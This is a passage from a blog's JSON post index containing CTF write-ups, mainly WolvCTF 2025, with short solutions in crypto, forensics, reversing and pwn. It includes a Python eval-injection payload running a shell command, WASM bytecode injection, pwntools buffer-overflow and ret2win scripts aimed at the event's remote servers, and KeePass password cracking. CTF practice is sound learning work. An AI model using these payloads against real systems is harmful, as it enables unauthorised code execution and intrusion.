ciphertext.dat -secret shared.datUsed this python script to decrypt the flag:from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadwith open(\"shared.dat\", \"rb\") as f:    shared_secret = f.read()with open(\"encrypted_flag.bin\", \"rb\") as f:    encrypted_flag = f.read()cipher = AES.new(shared_secret, AES.MODE_ECB)decrypted_flag = unpad(cipher.decrypt(encrypted_flag), 16)print(decrypted_flag.decode())I got the flag!Flag: TsukuCTF25{W3lc0me_t0_PQC_w0r1d!!!}"
  },
  
  {
    "title": "WolvCTF 2025 writeups",
    "url": "/posts/wolvctf_2025_writeup/",
    "categories": "CTF, WolvCTF",
    "tags": "ctf, writeups, cybersecurity, forensics, reverse-engineering, pwn, cryptography",
    "date": "2025-03-27 21:45:00 +0530",
    





    
    "snippet": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, al...",
    "content": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, alumni, university staff, and local industry professionals who are all focused on creating a fun, friendly, collaborative learning environment for cybersecurity.WolvCTF 2025 is consists of challenges ranging from beginner to hard in difficulty and topics like RevEng, Forensics, OSINT, Web Exploit, Cryptography, Binary Exploit and Misc. The event was conducted online from Sat, 22 March 2025, 04:30 IST ‚Äî Mon, 24 March 2025, 04:30 IST.This is their CTF webpage - https://wolvctf.io/This is their CTFtime profile - https://ctftime.org/event/2579MiscSanity CheckExplanation:They told us to check out their discord server. So just like many challenges of this type, the flag must be somewhere in the server.While inspecting, the channels in the server we can view the flag stored in the channel topic of ‚Äúfaq‚Äù channel.We got the flag!Flag: wctf{m1chigan_NCAA_champi0ns_inc0ming}Eval is EvilExplanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. As it is gzip compressed and tar compressed, lets decompress it using the below commands:gzip -d dist.tar.gztar -xvf dist.tarelse you can use a one-liner command to completely extract the file contents:tar -xvzf dist.tar.gzNow after extracting the compressed folder you will get this - challenge/chall.py. So what we are given is a python file. Let‚Äôs inspect the source code.import randomdef main():        print(\"Let's play a game, I am thinking of a number between 0 and\", 2 ** 64, \"\\n\")    try:        guess = eval(input(\"What is the number?: \"))    except:        guess = 0    correct = random.randint(0, 2**64)        if (guess == correct):        print(\"\\nCorrect! You won the flag!\")        flag = open(\"flag.txt\", \"r\").readline()        print(flag)    else:        print(\"\\nYou lost lol\")main()After inspecting the source code you can understand that the program asks the user enter a number between 0 and 2**64 which is 18,446,744,073,709,551,616 üòÆ. Then evaluates it, if the user entered a valid input, it stores the value in a variable - guess, and compares it to a random valued variable - correct. If the values match then the program is going to print the content of flag.txt. But who is talented enough to guess what random value is generated by the program, right!We can exploit this program using - arbitary code execution ( The user can enter ANY Python code ). We can input the below line as the input, then we can have the contents of flag.txt.__import('os').system(\"cat flag.txt\")Explanation of above command - As there is a possiblity of arbitary code execution, we are inserting a python code as the input. The code consist of os module in Python provides a way to interact with the operating system. It allows your Python program to perform system-level tasks. Which can also mean we can execute system commands. So we are using - cat to read the contents of flag.txt, this will give us the flag.We got the flag!NOTE: If you didn‚Äôt get the flag and it shows the error - ‚Äúcat: flag.txt: no such file or directory‚Äù, its because you are running the code in local which has no flag.txt file, when you run the given netcat command, you will get the flag stored in the flag.txt of the remote server.Flag:  wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}Wasm 0Explanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. To get started we have to first extract the contents of the downloaded compressed folder. As the process is similiar in most of the challanges I won‚Äôt be mentioning in every challenge, so please refer to the explanation of Eval is Evil challenge writeup for the process to decompress.After decompressing, we will be provided with three files - 0.js, wasm.js and package.json. I have provided the source code of each file below.const readline = require(\"readline\");const rl = readline.createInterface({    input: process.stdin,    output: process.stdout});let { Builder, parseHex } = require('./wasm.js');function win() {    console.log(\"wctf{redacted-flag}\");}let mod = new Builder();// (type ;0; () -&gt; ())mod.addSection(1, [0x01, 0x60, 0x00, 0x00]);// (func ;0; (import \"i\" \"win\") (type 0))mod.addSection(2, [0x01, 0x01, 0x69, 0x03, 0x77, 0x69, 0x6e, 0x00, 0x00]);// (func ;1; (type 0))...mod.addSection(3, [0x01, 0x00])// (func ;1; (export \"main\") (type 0))mod.addSection(7, [0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01])rl.question(\"&gt;&gt;&gt; \", (answer) =&gt; {    mod.addSection(10, parseHex(answer));    let wasmMod = new WebAssembly.Module(new Uint8Array(mod.data));    let instance = new WebAssembly.Instance(wasmMod, { 'i': { win } });    instance.exports.main();    process.exit(0);});let isEven = require('is-even');function leb128(n) {    let result = [];    do {        result.push((n &amp; 0x7f) | 0x80);        n &gt;&gt;= 7;    } while (n)    result[result.length - 1] &amp;= 0x7f;    return result;}class Builder {    constructor() {        this.data = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];    }    addSection(id, section) {        this.data.push(id);        this.data.push(...leb128(section.length));        this.data.push(...section);    }}// node doesn't support Uint8Array.fromHex :(function parseHex(answer) {    // javascript developers try not to write literally anything    // into a package challenge IMPOSSIBLE    if (!isEven(answer.length)) {        console.log(\"odd\");        process.exit(1);    }    let result = [];    for (let i = 0; i &lt; answer.length; i += 2) {        result.push(parseInt(answer.substring(i, i+2), 16));    }    return result;}module.exports = { Builder, parseHex }{  \"name\": \"wasmjail\",  \"version\": \"1.0.0\",  \"scripts\": {    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"  },  \"author\": \"\",  \"license\": \"ISC\",  \"description\": \"\",  \"dependencies\": {    \"is-even\": \"^1.0.0\"  }}Explanation of source code:0.js is a NodeJS code designed to create and execute WebAssembly (WASM) module dynamically, but seeing the way it processes the user input, it is vulnerable to WASM-based code injection aka arbitrary WebAssembly bytecode injection.Wasm.js is a NodeJs code provides helper functions for constructing WebAssembly (WASM) binaries dynamically. Since parseHex(answer) directly converts user input into executable WASM bytecode, an attacker can inject malicious WASM instructions, trigger arbitrary WebAssembly functions.So I am going to provide hex input that will be added as section 10 (the code section) of the module. So the hex string payload I will be providing to exploit the vulnerability is:01040010000bWhere,  0x01 for 1 function  0x04 for size (4 bytes)  0x00 for 0 locals  0x10 0x00 to call function index 0 (the imported win function)  0x0b to end the functionWhen we enter the string as input to tne netcat command, we will get the flag.We got the flag!BeginnerREverseHints:  You might want to use a decompiler  https://dogbolt.org/Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - reverse and a text file - out.txt. From the hints we can understand that it is asking us to use a decompiler to analyse the binary. I am using Ghidra for binary analysis (you can use online decompiler - dogbolt as mentioned in the second hint).After analyzing the decompiled code of the binary, I got to know that it is a code to mix the contents of flag.txt, and the out.txt contains the output. So we have to reverse the output to get the input.I have written a python code to reverse the process.def unmix_flag(mixed_flag):    original_flag = ''.join(chr(ord(c) + 3) for c in mixed_flag)        return original_flagmixed_flag = input(\"Enter the mixed flag: \")original_flag = unmix_flag(mixed_flag)print(\"Original flag:\", original_flag)When we the give the contents of out.txt as the input of this pythond code, we will get the flag.(I don‚Äôt think this is the process, it must be a bug in the content of out.txt, according to the given binary file, it is also supposed to reverse it after subtracting 3, but when I try it that way I got the reverse flag. So I eliminated the revering process and only subtracted 3 in the python code.)We got the flag!Flag:  wctf{r3v3r51ng_1n_r3v3r53}REdata - RevHints:  did you know that there is information other than code in a binary?  Are there any utilities that let you find strings in files?Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get an ELF 64-bit file - redata. As the hint mentioned something about strings I used strings and grep command to get the flag.strings redata | grep \"wctf\"We got the flag!Flag: wctf{n0_w4y_y0u_f0unD_1t!}OverAndOver - CryptoHints:  Perhaps decoding once isnt enough?Explanation:After downloading and viewing the contents of the text file - encoded.txt, it looked like it was encrypted. So I tried base64 decoding.base64 -d encoded.txtIt somehow didn‚Äôt work YET!, as it is not geneating any invalid characters while decoding, it must be base64 encoded and from the challenge name and the hint, we can understand that it is being encoded multiple times.So as I didn‚Äôt know how many times I keep on running the below command to get the flagecho \"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0weGIxSkdXbGRYYlVaclVqRmFTRll5TVRSVk1rcElaSHBHVjJFeVVYZFpla3BIWXpGT2RWVnRhRk5sYlhoWFZtMHdlR0l4U2tkWGJHUllZbGhTV0ZSV2FFTlNiRnBZWlVoa1YwMUVSa1pWYkZKRFZqSkdjbUV6YUZaaGExcG9WakJhVDJOdFJrZFhiV2hzWWxob2IxWnRNWGRVTVZWNVVtdGtWMWRIYUZsWmJHaFRWMFpTVjFwRVFrOWlSM2hYVmpKNFQxWlhTa2RqUm14aFUwaENSRlpxUVhoa1ZsWjFWMnhrYUdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYXpWWVZXcE9iMkl4V1hoYVJGSnBUVlpXTkZaWGRHdFhSMHB5VGxac1dtSkdXbWhaTW5oWFl6RldjbHBHYUdsU00xRjZWakowVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZVYkdocFZqSm9lbGRYZUc5aU1rbDRWMjVTVGxkSFVsWlVWbHBYVGxaV2RHUkhkRmROVjFKSldWVmFjMWR0U2tkWGJXaGFUVlp3VkZacVJtdGtSa3AwWlVaa2FWSnNhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WazVzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0doWmEyUkdaVWRPU1dKR1pGZFNWWEJ2Vm10U1MxUXlVa2RUYmtwaFVtMW9jRlpxVG05V1ZtUlhWV3M1VWsxWFVraFdNalZUVkd4YVJsTnNhRlZXTTJoSVZHeGFZVmRGTlZaUFZtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1lVWndSbHBHVGxSU2EzQjVWR3hhVDJGV1NuUlBWRTVYVFc1b1dGZFdXbEpsVmtweVdrWm9hV0Y2Vm5oV1ZFSnJUa1prUjFWc1pGaGhNMUpWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYyRkhhRTVXYmtKMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVFZjNWJHSkhVbGxhVldNMVlWVXhXRlZ1Y0ZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZteHdNMXBYZUhKbFZURldXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVc1b1YxWXphSEpXVkVaelZqRldjMWRzYUdsV1ZuQjZWMWQwWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVmxsNVpVaGtXR0pHY0ZoWk1HaExWakpHY2xkcmVGZGhhM0JRVldwR1lXTXlSa2RoUmxKVFZsaENTMVpxUm1GVk1VMTRWbGhvV0ZkSGFHaFZNRnBoVm14c2NsZHJkR3BTYkhCNFZUSXdOV0pIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFV6RktjMXBJVmxSaVJscFlXV3RvUTA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVWMkZyV2t4Vk1uaHJWakZhZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVmpKS2NsTnJhRmRTTTJob1ZrUktSMWRHU2xsYVIzQlRWak5vV1ZkWGVHOVJNVTE0Vld4a1lWSldjSE5WYlRGVFYyeGtjbFpVUmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBhWVd0YWVsWnFSbGRqTVdSellVZG9UazFWY0RKV2JHTjRUa2RSZVZaclpGZGliRXBQVm14a1UySXhVbGRXYm1Sc1lrWnNOVnBWWkVkV01rcEhZa1JhV2xaWGFFeFdNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdSMWxYVFhsU2EyUm9VbXhLVkZac2FFTlRNVnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR0ZIYUZaTlJuQm9WbTE0YzJOc1pISmtSM0JUWWtad05GWlhNVEJOUmxsNFYyNU9hbEpYYUZoV2FrNVRWRVpzVlZGWWFGTldhM0I2VmtkNFlWVXlTa1pYV0hCWFZsWndSMVF4V2tOVmJFSlZUVVF3UFE9PQ==\" | base64 -dI used the above command because I can‚Äôt always decode and store it in another file to decode it again and open it everytime to know whether I got the flag, so I use the above command, use the output in the echo to decode it again. After running it multiple times (16 or 32, I don‚Äôt remember üòÖ). We will get the flag.We got the flag!Flag: wctf{bA5E_tWo_p0W_s!X}EtTuCaesar - CryptoHints:  A Caesar salad isn‚Äôt complete without a good toss‚Äîmaybe try unscrambling it from different angles?  What if I put the note in the shape of a square?Explanation:This is the string in the given file - message.txt.tzc3Sq{k!ss!a!__FZ!!_!11}As it mentioned caesar cipher, I tried decoding it and at shift value 3, I got this:wcf3Vt{n!vv!d!__IC!!_!11} Though it looks like a flag, it isn‚Äôt from the hints we can know that to get the flag we have to arrange it in square. As the length is 25, let‚Äôs try to arrange it in 5x5 square.w c f 3 Vt { n ! vv ! d ! __ I C ! !_ ! 1 1 } After spending some time to find the pattern for the flag, I got the pattern it is1   2   4   7   113   5   8   12  166   9   13  17  1810  14  19  20  2115  22  23  24  25This pattern name is - diagonal filling pattern a.k.a diagonal traversal pattern. Arranging the decoded string in the order will give us the flag.We got the flag!Flag: wctf{v3n!_V!dI_v!C!_!1!1}PicturePerfect - ForensicsHint:  Images have interesting information in their metadata!Explanation:From the hint we can understand that the flag is in the metadata, so I used the exiftool to get the flag.exiftool hi_snowman.jpgWe will get the flag as the value of - Title, in the metadata.We got the flag!Flag: wctf{d0_yOU_w@nt_t0_BUiLd_a_Sn0Wm@n}DigginDir - ForensicsHint:  I wish there was a linux utility that let me search for stuff‚Ä¶Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a folder - challenge which consists of 251 folders with each folder containg a text file. I expect that out of all folders one folder‚Äôs text file should have the flag. But we can‚Äôt keep checking every file manually so I used the below command:grep -r \"wctf\" .This command traverses all the contents and finds the string which contains - wctf, which is a part of the flag.We got the flag!Flag: wctf{0h_WOW_tH@Nk5_yOu_f0U^d_1t_xD}p0wn3d - PwnHint:  What is a buffer overflow? What is acii?Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow, so I created a python script to exploit the remote server, here is the python code:from pwn import *p = remote(\"p0wn3d.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32  payload += p32(0x42424242)  p.sendlineafter(\"Hello little p0wn3r. Do you have any first words?\", payload)p.interactive()Using this python script will give us the flag.We got the flag!Flag: wctf{pwn_1s_l0v3_pwn_1s_l1f3}p0wn3d_2 - PwnHint:  Stack layout? I wish I had GDB with me‚Ä¶Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has stack layout issue. So to exploit it, I have written a python script which exploits the buffer overflow vulnerability in the remote server.from pwn import *p = remote(\"p0wn3d2.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32         payload += p32(0xdeadbeef)  payload += p32(0x0badc0de)  p.sendlineafter(\"I can't believe you just did that. Do you have anything to say for yourself?\", payload)p.interactive()This python source code will give us the flag.We got the flag.Flag: wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}p0wn3d_3 - PwnHint:  look up what ret2win isExplanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.From the hint, ret2win is a return-oriented attack where the goal is to hijack execution flow and directly call a function (get_flag()). Instead of injecting shellcode, the exploit simply redirects execution to an existing function in the binary. This is possible because the binary already contains a useful function (get_flag()) that prints the flag.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has no stack canaries, no Address Space Layout Randomization (ASLR) or PIE.To exploit this, I crafted a python code which exploits a buffer overflow vulnerability in the binary chal or the remote server and use the ret2win technique to call the get_flag() functionfrom pwn import *REMOTE = True  BINARY = \"./chal\"elf = ELF(BINARY)context.binary = elfif REMOTE:    p = remote(\"p0wn3d3.kctf-453514-codelab.kctf.cloud\", 1337)else:    p = process(BINARY)get_flag = elf.symbols[\"get_flag\"]log.success(f\"get_flag address: {hex(get_flag)}\")offset = 40  payload = b\"A\" * offset  payload += p64(get_flag)  p.sendlineafter(\"something like this before\\n\", payload)p.interactive()  This python source code will give us the flag.We got the flag.Flag: wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}ForensicsPasswordsExplanation:We were given a file - Database.kdbx which is a Keepass password database.(KeePass is a free, open-source password manager that helps you securely store and manage your passwords in an encrypted database. The database file usually has a .kdbx extension and is protected by a master password, key file, or both.)Let‚Äôs try to open it using keepassxc.keepassxc Database.kdbxBut it is asking for password, so let‚Äôs crack the password using John The Ripper.john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtThis gave us a password - goblue1. Now opening the keepass password database using the password, we can see the interface and on the left, sections like - Windows, Network etc., each section has a entry, by double-clicking on it and using the show icon on the password we can view the password. Now let‚Äôs try searching for the flag. We can find the flag in Homebanking.We got the flag!Flag: wctf{1_th0ught_1t_w4s_s3cur3?}BreakoutExplantion:We are given a jpg file - breakout.jpg. So after researching on what breakout it and viewing the image, it turns out Breakout is a game developed by Atari in 1976. So this challenge has something to do with the game.Now I used various tools on the image found nothing helpful, luckily on using steghide f=I found somethingsteghide extract -sf breakout.jpgI was able to extract a file - breakout.ch8 which is embeded into the image using steganography..ch8 is a ROM file for the CHIP-8 virtual machine/interpreter. CHIP-8 is an old programming language used in the 1970s primarily for gaming on microcomputers and is now commonly used in emulation.So I think we should play the game to get the flag, I tried searching for online chip-8 emulators to play the game and found - https://ffhan.github.io/ . The webpage allows us to load the chip-8 file and play the game. So I played the classic game and completed it, this gave me the flag.We got the flag!Flag: WCTF{GAME_OVER_VMASBKLTNUFMGS}So, YEP! These are the challenges I solved in WolvCTF 2025. There were a few other challenges that I got stuck on and couldn‚Äôt quite solve, but I came close. My favorite challenge from this CTF was definitel Breakout - it involved exploring an old programming language and revisiting the nostalgic Atari game Breakout!Overall, WolvCTF 2025 was an amazing experience! I learned a lot about forensics and reverse engineering, and I even came to love pwn. While I managed to solve most challenges, I struggled with some OSINT and reverse engineering challenges. I‚Äôll be focusing on improving my skills for the next CTF!Big shoutout to my team, WolvSec, for the teamwork and support! Huge thanks to the organizers of WolvCTF 2025 for putting together such an exciting competition.If you found this writeup helpful or have any thoughts, feel free to reach out‚Äîlet‚Äôs connect! Looking forward to the next CTF! üöÄ"
  },
  
  {
    "title": "Welcome to My Blog üëã",
    "url": "/posts/welcome/",
    "categories": "Others",
    "tags": "welcome",
    "date": "2025-03-14 00:00:00 +0530",
    





    
    "snippet": "Hello and welcome to my blog! üöÄI‚Äôm passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:üèÜ CTF Writeu...",
    "content": "Hello and welcome to my blog! üöÄI‚Äôm passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:üèÜ CTF Writeups ‚Äì Breaking down challenges, strategies, and solutions.üîê Cybersecurity Insights ‚Äì Topics, tools, and techniques that I find useful.üõ†Ô∏è Projects ‚Äì Showcasing my work in cybersecurity and related fields.üèÖ Achievements ‚Äì Highlights of my journey in this exciting domainWhy This Blog?The cybersecurity world is vast, and learning never stops. By documenting my experiences, I hope to:‚úÖ Help others understand and solve challenges.‚úÖ Contribute to the cybersecurity community.‚úÖ Track my own progress and growth.Stay tuned for upcoming posts, and feel free to connect or leave feedback! üî•Cheers,CYB3R-BO1"
  }
  
]

